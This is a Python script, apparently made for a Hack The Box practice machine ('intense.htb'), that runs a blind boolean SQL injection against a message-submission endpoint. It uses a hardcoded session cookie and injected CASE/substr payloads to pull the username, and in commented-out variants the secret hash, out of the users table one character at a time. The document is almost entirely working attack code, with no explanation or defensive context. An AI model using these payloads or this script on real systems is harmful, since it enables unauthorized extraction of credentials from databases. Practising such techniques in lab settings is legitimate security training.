import requests

cookie = "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.4uF40RAA+EnwwNCMtQnkEHP/KCjuoVoqqwoPT9mxGvE="
url = "http://intense.htb/submitmessage"
cookies = dict(auth=cookie)


'''
front = "'||(SELECT(CASE WHEN "
mid ="=(SELECT hex(substr(username,"
back=",1)) from users Limit 1) THEN '' ELSE (SELECT 1 from users LIMIT 1 OFFSET .2)END)));--"
'''
'''
front="'||(Select(CASE \""
mid = "\"=(SELECT hex(substr(secret,"
back=",1)) from users limit 1) WHEN 1 THEN '' ELSE (SELECT 1 from users LIMIT 1 OFFSET .2)END)));--"
'''

hfront = "'||(SELECT(CASE WHEN \""
hmid ="\"=(SELECT hex(substr(username,"
hback=",1)) from users Limit 1) THEN '' ELSE (SELECT 1 from users LIMIT 1 OFFSET .2)END)));--"

afront = "'||(SELECT(CASE WHEN \""
amid ="\"=(SELECT substr(username,"
aback=",1) from users Limit 1) THEN '' ELSE (SELECT 1 from users LIMIT 1 OFFSET .2)END)));--"

def ascii_search():
    for pos in range(1,6):
        loc = str(pos)
        '''
        print(loc)
        '''
        for i in range(0,127):
            guess = chr(i)
            cur = afront + guess + amid + loc + aback
            '''
            print("\tguess: " + guess)
            print("\t\turl: "+cur)
            '''
            payload = {'message': cur}
            response = requests.post(url, data=payload,cookies=cookies)
            ret = response.text
            '''
            print(ret)
            '''
            if ("OK" in ret):
                print(guess,end='')
                break;

def hex_search():
    for pos in range(1,6):
        loc = str(pos)
        for hx in range(0,256):
            guess = hex(hx)[2:].upper()
            if (hx <= 15):
                guess = "0"+guess
            cur = hfront + guess + hmid + loc + hback
            '''
            print("\tguess: " + guess)
            print("\t\turl: "+cur)
            '''
            payload = {'message': cur}
            response = requests.post(url, data=payload,cookies=cookies)
            ret = response.text
            '''
            print(ret)
            '''
            if ("OK" in ret):
                print(guess,end='')
                break;

ascii_search()
